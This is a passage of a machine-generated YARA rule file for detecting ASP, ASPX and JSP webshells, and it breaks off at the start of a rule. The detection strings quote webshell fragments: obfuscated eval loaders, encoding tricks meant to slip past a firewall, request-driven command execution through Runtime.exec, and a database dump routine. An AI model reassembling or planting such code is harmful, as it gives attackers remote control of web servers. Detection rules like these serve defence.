      $s10 = "gadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaer" ascii
      $s11 = "hnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghr" ascii
      $s12 = "gaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrr" ascii
      $s13 = "gejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgj" ascii
      $s14 = "ewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgw" ascii
      $s15 = "tgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgr" ascii
      $s16 = "gjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejg" ascii
      $s17 = "enregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadf" ascii
      $s18 = "\\\"\"+\")\";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/); /*gadfgaerehrrtgregjgrgejgewg" ascii
      $s19 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre*/ %>" fullword ascii
      $s20 = "+\"t\"+\"[/*-/*-*/116679702/*-/*-*/-/*-/*-*/14254250/*-/*-*/-/*-/*-*/102425454/*-/*-*/]\"+\",\"+\"\\\"\"+\"u\"+\"n\"+\"s\"/*-/*-" ascii
   condition:
      uint16(0) == 0x253c and filesize < 8KB and
      8 of them
}

rule webshell_asp_w02 {
   meta:
      description = "webshell - file w02.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "edf86c8b587dfbaa3de9635db2ba83c5bc4092db8bd4793bdc0e6f1c59a79a3a"
   strings:
      $s1 = "<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u" ascii
      $s2 = "<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u" ascii
      $s3 = "egwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegakl" ascii
      $s4 = "ehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgre" ascii
      $s5 = "rghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre" ascii
      $s6 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewge" ascii
      $s7 = "wjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwe" ascii
      $s8 = "gaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrg" ascii
      $s9 = "mgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnew" ascii
      $s10 = "gadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaer" ascii
      $s11 = "hnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghr" ascii
      $s12 = "gaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrr" ascii
      $s13 = "gejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgj" ascii
      $s14 = "ewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgw" ascii
      $s15 = "tgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgr" ascii
      $s16 = "gjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejg" ascii
      $s17 = "enregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadf" ascii
      $s18 = "eval (/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/); /*gadfgaerehrrtgregjgrgejgewgjewgewjgwegwe" ascii
      $s19 = "wjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre*/ %>" fullword ascii
      $s20 = "+\"t\"+\"[/*-/*-*/0/*-/*-*/-/*-/*-*/14254250/*-/*-*/-/*-/*-*/102425454/*-/*-*/]\"+\",\"+\"\\\"\"+\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"" ascii
   condition:
      uint16(0) == 0x253c and filesize < 8KB and
      8 of them
}

rule webshell_aspx_abcd {
   meta:
      description = "webshell - file abcd.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "268a4ecf7afaedc0b2776ff8896405ace616f9e22e9c9a14e50781f7928b5f7f"
   strings:
      $s1 = "<%@PAGE LANGUAGE=JSCRIPT%>" fullword ascii
      $s2 = "Request[\"\\x61\\x62\\x63\\x64\"];eval" fullword ascii
      $s3 = "<%var PAY:String=" fullword ascii
      $s4 = "(PAY,\"\\x75\\x6E\\x73\\x61\"+" fullword ascii
      $s5 = "\"\\x66\\x65\");%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule aspx {
   meta:
      description = "webshell - file aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "edb7873e1d8e27b8cedeec53a78aed2d9c70c4576f1bdf57d1012f521833bc48"
   strings:
      $s1 = "GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5JdGVtWyJ6Il0=\"))));" fullword ascii
      $s2 = "popup(popup(System.Text.Encoding.GetEncoding(65001)." fullword ascii
      $s3 = "password:z" fullword ascii
      $s4 = "<script runat=\"server\" language=\"JScript\">" fullword ascii
      $s5 = "var a = q + \"ns\" + w;" fullword ascii
      $s6 = "return(b);" fullword ascii
      $s7 = "var b= eval(str,a);" fullword ascii
      $s8 = "function popup(str) {" fullword ascii
      $s9 = "var q = \"u\";" fullword ascii
      $s10 = "var w = \"afe\";" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      all of them
}

rule bypass_safedog_01 {
   meta:
      description = "webshell - file bypass_safedog_01.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d05c318a7a894d27e152be19f2e459d6e9b93c1e10bcc7af26dd940d9e716ac1"
   strings:
      $s1 = "556675766874782F4C75696E5E237E2360" ascii /* hex encoded string 'Ufuvhtx/Luin^#~#`' */
      $s2 = "<script runat=\"server\" language=\"JScript\">" fullword ascii
      $s3 = "function dec(str,key) {" fullword ascii
      $s4 = "  var a = q + \"ns\" + w;" fullword ascii
      $s5 = "  for(k = 0; k < str.length; k=k+2)" fullword ascii
      $s6 = "  var b= /*///*/eval(str,a);" fullword ascii
      $s7 = "  return(s);" fullword ascii
      $s8 = "function exs(str) {" fullword ascii
      $s9 = "  return(b);" fullword ascii
      $s10 = "      s = s + char(int(q)-p);// + \"|\" + p +\"|\";" fullword ascii
      $s11 = "      q = \"0x\"+ str.substr(k, 2);" fullword ascii
      $s12 = "      s = s + char(int(q)-p);" fullword ascii
      $s13 = "      q = \"0x\"+ str.substr(k, 4);" fullword ascii
      $s14 = "    t = ((k+2)/2) % key.length;" fullword ascii
      $s15 = "    p = key.substr(t, 1);" fullword ascii
      $s16 = "exs(exs(dec(\"556675766874782F4C75696E5E237E2360\",\"1314\"))); " fullword ascii
      $s17 = "  var w = \"afe\";" fullword ascii
      $s18 = "  var q = \"u\";" fullword ascii
      $s19 = "  var p=\"\";" fullword ascii
      $s20 = "  var k,q,t;" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      8 of them
}

rule Asp {
   meta:
      description = "webshell - file Asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac475ae41ecd957f2e5a6aebeb327467e7b902d071afd9934e4bcdee62bdeed6"
   strings:
      $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword ascii
      $s2 = "password:z" fullword ascii
      $s3 = "Function MorfiCoder(Code)" fullword ascii
      $s4 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule jfolder01 {
   meta:
      description = "webshell - file jfolder01.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s4 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s5 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
      $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s7 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s8 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s14 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s15 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s16 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s17 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s18 = "\",\"Execute\"};" fullword ascii
      $s19 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s20 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_JFolder {
   meta:
      description = "webshell - file JFolder.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s4 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s5 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
      $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s7 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s8 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s14 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s15 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s16 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s17 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s18 = "System.out.println(strCommand);" fullword ascii
      $s19 = "\",\"Execute\"};" fullword ascii
      $s20 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_shell1 {
   meta:
      description = "webshell - file shell1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s4 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s5 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
      $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s7 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s8 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s14 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s15 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s16 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s17 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s18 = "System.out.println(strCommand);" fullword ascii
      $s19 = "\",\"Execute\"};" fullword ascii
      $s20 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_jsp {
   meta:
      description = "webshell - file jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s4 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s5 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
      $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s7 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s8 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s14 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s15 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s16 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s17 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s18 = "\",\"Execute\"};" fullword ascii
      $s19 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s20 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule mysql {
   meta:
      description = "webshell - file mysql.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "709925f24268dcfe93d666d210b38ddee557bfd08b13744426b4fc44ce955008"
   strings:
      $s1 = "    Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
      $s2 = "        rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
      $s3 = "        rs = stmt.executeQuery(\"SHOW CREATE TABLE \" + table);" fullword ascii
      $s4 = "        out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
      $s5 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
      $s6 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
      $s7 = "//            osw.append(rs.getString(2) + \"\\n\\n\");" fullword ascii
      $s8 = "<%@ page import=\"java.util.*\" %>" fullword ascii
      $s9 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s10 = "    String password = \"pass\";" fullword ascii
      $s11 = "        tables.add(rs.getString(3));" fullword ascii
      $s12 = "             *                      ) TYPE=MyISAM" fullword ascii
      $s13 = "out.println(\"<p><h3>finished</h3></p>\");" fullword ascii
      $s14 = "    String ex=\".txt\";" fullword ascii
      $s15 = "    //" fullword ascii /* reversed goodware string '//    ' */
      $s16 = "             *                        PRIMARY KEY (id)" fullword ascii
      $s17 = "                if (col == rsmd.getColumnCount())" fullword ascii
      $s18 = "                    bw.append(rs.getString(col));" fullword ascii
      $s19 = "                if (rs.getString(col) == null)" fullword ascii
      $s20 = "            for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 8KB and
      8 of them
}

rule webshell_jsp_pb {
   meta:
      description = "webshell - file pb.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5163e587efebeacc87186b768ba1dab34579131dbbab9ebf9044fe3088c8c3e7"
   strings:
      $x1 = "l; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStre" ascii
      $s2 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
      $s3 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
      $s4 = "<%@ page contentType=\"text/html; charset=GBK\" %>" fullword ascii
      $s5 = " <%=output %> </pre>" fullword ascii
      $s6 = "am())); while((s = sI.readLine()) != null) { output += s +\"\\\\r\\\\n\"; } } catch(IOException e) { e.printStackTrace(); } } %>" ascii
   condition:
      uint16(0) == 0x0931 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_jsp_c5 {
   meta:
      description = "webshell - file c5.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x2 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $s4 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s5 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s6 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s7 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s8 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s9 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s10 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s11 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s12 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s13 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s14 = "<td><span style=\\\"float:right;\\\">JspSpy Ver: 2010</span>\"+request.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getL" ascii
      $s15 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total (unkn" ascii
      $s16 = ").getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.clipboardData){alert('only support IE!');}else{void(window.cl" ascii
      $s17 = "\\\\cmd.exe\")+\"\\\"/>\"+" fullword ascii
      $s18 = "StreamConnector.readFromRemote(targetS,yourS,new DataInputStream(yourS.getInputStream()),new DataOutputStream(targetS.getOutputS" ascii
      $s19 = "out.println(\"<select id=\\\"catalogs\\\" onchange=\\\"if (this.value == '0') return;doPost({o:'executesql',type:'switch',catalo" ascii
      $s20 = "(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_403 {
   meta:
      description = "webshell - file 403.jsp"
